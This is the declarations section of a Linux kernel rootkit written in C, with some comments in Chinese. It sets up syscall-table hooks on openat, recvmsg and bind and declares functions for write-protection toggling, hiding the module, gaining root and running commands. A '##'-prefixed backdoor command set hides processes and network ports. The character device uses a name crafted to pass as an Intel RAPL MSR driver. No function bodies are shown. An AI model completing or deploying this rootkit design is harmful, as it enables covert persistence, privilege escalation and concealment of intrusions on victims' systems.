#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/inet_diag.h> /* Needed for ntohs */
#include <net/tcp.h>         // struct tcp_seq_afinfo.
#include <net/udp.h>         // struct tcp_seq_afinfo.
#include <linux/printk.h>

#include "hide_pid.c"

#define DEVICE_NAME "inter_rapl_msrdv"
#define CLASS_NAME "inter_rapl_msrmd"
#define DEVICE_PATH "/dev/inter_rapl_msrdv"

static int major_num;
static struct class *module_class = NULL;
static struct device *module_device = NULL;
static struct file *__file = NULL;
struct inode *__inode = NULL;

static int rootkit_open(struct inode *, struct file *);
static int rootkit_release(struct inode *, struct file *);
static ssize_t rootkit_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t rootkit_write(struct file *, const char __user *, size_t, loff_t *);
static long rootkit_ioctl(struct file *, unsigned int, unsigned long);

//声明我们自己写的sys_openat函数
static long my_sys_openat(const struct pt_regs *regs);

//声明系统调用表地址
static void **real_sys_call_table = 0;

typedef long (*syscall_fun)(const struct pt_regs *regs);

static syscall_fun real_sys_openat;

static syscall_fun real_sys_recvmsg;
static syscall_fun real_sys_bind;

static 

void enable_wp(void);

void disable_wp(void);
static struct file_operations rootkit_fo = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = rootkit_ioctl,
    .read = rootkit_read,
    .open = rootkit_open,
    .release = rootkit_release,
    .write = rootkit_write};

static struct list_head *prev;

// 模块隐藏
static void hide_myself(void);

// 模块隐藏恢复声明
static void show_myself(void);

// 提升root权限函数声明
static void get_root(void);

// 模块加载、卸载函数声明
static int __init rootkit_init(void);
static void __exit rootkit_exit(void);

static inline void module_info(void);

static char *exec_cmd(char *cmd);

#define BACKDOOR_PREFIX "##"
#define HIDE_PORT "##hide_port"
#define UNHIDE_PORT "##unhide_port"

#define HIDE_PID "##hide_pid"
#define UNHIDE_PID "##unhide_pid"
#define UNHIDE_ALL_PID "##unhide_all_pid"

#define TCP_CONNECT 1
#define UDP_CONNECT 2
#define TCP6_CONNECT 3
#define UDP6_CONNECT 4


#define PORT_STR_LEN 6

typedef int (*seq_show_fun)(struct seq_file *seq, void *v);

struct port_node
{
    unsigned int port;
    int type;
    struct list_head list;
};


int hide_connect_init(void **real_sys_call_table);
int hide_connect_exit(void **real_sys_call_table);
void set_seq_operations(const char* open_path,struct seq_operations** operations);
void hook_seq_operations(void *base, size_t offset, void *new_ptr, void **old_ptr);
int fake_seq_show(struct seq_file *seq, void *v);
void hide_connect(int type, int port);
void unhide_connect(int type, int port);
static ssize_t my_sys_recvmsg(const struct pt_regs *regs);
bool get_connect_param(const char* str,int *port,int *type);
static bool data_should_be_masked(struct nlmsghdr *nlh);

